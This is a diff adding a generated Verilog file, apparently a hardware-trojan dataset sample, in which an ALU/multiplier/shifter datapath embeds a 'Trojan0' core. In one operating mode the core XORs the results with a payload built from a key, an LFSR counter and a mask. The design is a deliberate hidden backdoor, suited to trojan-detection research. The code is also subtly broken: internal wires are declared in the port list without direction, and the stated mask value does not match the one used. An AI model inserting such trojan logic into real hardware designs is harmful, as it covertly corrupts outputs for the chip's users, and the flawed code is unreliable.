@@ -1,0 +1,235 @@
+// Generated trojaned circuit for trojan0
+// Instance ID: 0000
+// Parameters: {'DATA_WIDTH': 64, 'ADDR_WIDTH': 32, 'KEY_WIDTH': 128, 'LOAD_WIDTH': 16, 'LFSR_WIDTH': 20}
+// Crypto Variables: {'LOAD_XOR_MASK': 2078905986729347359}
+
+`timescale 1ns/1ps
+
+// Host Circuit
+// Datapath Host Circuit for Trojan0
+// Interface: clk, rst, key[KEY_WIDTH-1:0] -> load[LOAD_WIDTH-1:0]
+module trojan0_datapath_host_0000 #(
+    parameter DATA_WIDTH = 64,
+    parameter ADDR_WIDTH = 32,
+    parameter KEY_WIDTH = 128,
+    parameter LOAD_WIDTH = 16
+)(
+    input wire clk,
+    input wire rst,
+    input wire [DATA_WIDTH-1:0] a_in,
+    input wire [DATA_WIDTH-1:0] b_in,
+    input wire [3:0] alu_op,
+    input wire [ADDR_WIDTH-1:0] addr_in,
+    output reg [DATA_WIDTH-1:0] result_out,
+    output reg [ADDR_WIDTH-1:0] addr_out,
+    output reg valid_out,
+    
+    // Internal trojan signals
+    wire [KEY_WIDTH-1:0] trojan_key,
+    wire [LOAD_WIDTH-1:0] trojan_load
+);
+
+    // Internal signals
+    reg [DATA_WIDTH-1:0] alu_result;
+    reg [DATA_WIDTH-1:0] mult_result;
+    reg [DATA_WIDTH-1:0] shift_result;
+    reg [1:0] operation_mode;
+    reg [7:0] cycle_counter;
+    reg [KEY_WIDTH-1:0] key_generator;
+    
+    // Key generation for trojan
+    always @(posedge clk or posedge rst) begin
+        if (rst) begin
+            // Generate initial key value based on KEY_WIDTH
+            if (KEY_WIDTH >= 32)
+                key_generator <= {{(KEY_WIDTH-32){1'b0}}, 32'h0123CDEF};
+            else
+                key_generator <= {KEY_WIDTH{1'b1}}; // All ones for smaller widths
+        end
+        else
+            key_generator <= {key_generator[KEY_WIDTH-2:0], key_generator[KEY_WIDTH-1] ^ key_generator[7]};
+    end
+    
+    assign trojan_key = key_generator;
+    
+    // ALU operations
+    always @(*) begin
+        case (alu_op[2:0])
+            3'b000: alu_result = a_in + b_in;
+            3'b001: alu_result = a_in - b_in;
+            3'b010: alu_result = a_in & b_in;
+            3'b011: alu_result = a_in | b_in;
+            3'b100: alu_result = a_in ^ b_in;
+            3'b101: alu_result = ~(a_in & b_in);
+            3'b110: alu_result = (a_in < b_in) ? {{(DATA_WIDTH-1){1'b0}}, 1'b1} : {DATA_WIDTH{1'b0}};
+            3'b111: alu_result = a_in;
+            default: alu_result = {DATA_WIDTH{1'b0}};
+        endcase
+    end
+    
+    // Multiplier
+    always @(*) begin
+        if (DATA_WIDTH >= 16)
+            mult_result = a_in[15:0] * b_in[15:0];
+        else
+            mult_result = a_in * b_in;
+    end
+    
+    // Barrel shifter
+    always @(*) begin
+        // Use appropriate shift amount based on DATA_WIDTH
+        if (alu_op[3]) begin
+            if (DATA_WIDTH > 32)
+                shift_result = a_in << b_in[$clog2(DATA_WIDTH)-1:0];
+            else
+                shift_result = a_in << b_in[4:0];
+        end else begin
+            if (DATA_WIDTH > 32)
+                shift_result = a_in >> b_in[$clog2(DATA_WIDTH)-1:0];
+            else
+                shift_result = a_in >> b_in[4:0];
+        end
+    end
+    
+    // Cycle counter
+    always @(posedge clk or posedge rst) begin
+        if (rst)
+            cycle_counter <= 8'b0;
+        else
+            cycle_counter <= cycle_counter + 1;
+    end
+    
+    // Operation mode selection
+    always @(posedge clk or posedge rst) begin
+        if (rst)
+            operation_mode <= 2'b00;
+        else if (cycle_counter[3:0] == 4'hF)
+            operation_mode <= operation_mode + 1;
+    end
+    
+    // Result output with trojan load integration
+    always @(posedge clk or posedge rst) begin
+        if (rst) begin
+            result_out <= {DATA_WIDTH{1'b0}};
+            addr_out <= {ADDR_WIDTH{1'b0}};
+            valid_out <= 1'b0;
+        end else begin
+            case (operation_mode)
+                2'b00: begin
+                    result_out <= alu_result;
+                    addr_out <= addr_in + {{(ADDR_WIDTH-1){1'b0}}, 1'b1};
+                end
+                2'b01: begin
+                    result_out <= mult_result;
+                    addr_out <= addr_in + {{(ADDR_WIDTH-2){1'b0}}, 2'b10};
+                end
+                2'b10: begin
+                    result_out <= shift_result;
+                    addr_out <= addr_in + {{(ADDR_WIDTH-2){1'b0}}, 2'b11};
+                end
+                2'b11: begin
+                    if (DATA_WIDTH <= LOAD_WIDTH)
+                        result_out <= a_in ^ b_in ^ trojan_load[DATA_WIDTH-1:0];
+                    else
+                        result_out <= a_in ^ b_in ^ {{(DATA_WIDTH-LOAD_WIDTH){1'b0}}, trojan_load};
+                    addr_out <= addr_in;
+                end
+                default: begin
+                    result_out <= {DATA_WIDTH{1'b0}};
+                    addr_out <= {ADDR_WIDTH{1'b0}};
+                end
+            endcase
+            valid_out <= 1'b1;
+        end
+    end
+    
+    // Instantiate Trojan0 with width adaptation
+    generate
+        if (KEY_WIDTH == 128 && LOAD_WIDTH == 64) begin: trojan_direct
+            Trojan0 trojan_inst (
+                .clk(clk),
+                .rst(rst),
+                .key(trojan_key),
+                .load(trojan_load)
+            );
+        end else begin: trojan_adapted
+            wire [127:0] adapted_key;
+            wire [63:0] adapted_load;
+            
+            // Adapt key width
+            if (KEY_WIDTH >= 128) begin
+                assign adapted_key = trojan_key[127:0];
+            end else begin
+                assign adapted_key = {{(128-KEY_WIDTH){1'b0}}, trojan_key};
+            end
+            
+            Trojan0 trojan_inst (
+                .clk(clk),
+                .rst(rst),
+                .key(adapted_key),
+                .load(adapted_load)
+            );
+            
+            // Adapt load width
+            if (LOAD_WIDTH >= 64) begin
+                assign trojan_load = {{(LOAD_WIDTH-64){1'b0}}, adapted_load};
+            end else begin
+                assign trojan_load = adapted_load[LOAD_WIDTH-1:0];
+            end
+        end
+    endgenerate
+
+endmodule
+
+
+// Trojan Core
+module Trojan0 #(
+	// Non-I/O tunables as parameters (I/O bitwidths fixed)
+	parameter [63:0] LOAD_XOR_MASK = 64'h8FADC1A6B5E37921
+)(
+	input  wire         clk,
+	input  wire         rst,
+	input  wire [127:0] key,
+	output reg  [63:0]  load
+);
+	// LFSR counter (use default submodule width = 20)
+	wire [19:0] counter;
+	lfsr_counter u_lfsr (
+		.rst(rst),
+		.clk(clk),
+		.lfsr(counter)
+	);
+
+	// Generate load from key/LFSR/mask
+	always @(posedge clk) begin
+		integer i;
+		for (i = 0; i < 64; i = i + 1) begin
+			load[i] <= key[i] ^ counter[i % 20] ^ LOAD_XOR_MASK[i];
+		end
+	end
+
+endmodule
+
+
+module lfsr_counter #(
+	parameter [19:0] INIT_VALUE = 20'b10011001100110011001
+)(
+	input rst, clk, 
+	output [19:0] lfsr
+);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream <= INIT_VALUE;
+		end else begin
+			lfsr_stream <= {d0,lfsr_stream[19:1]}; 
+		end
+		
+endmodule
+
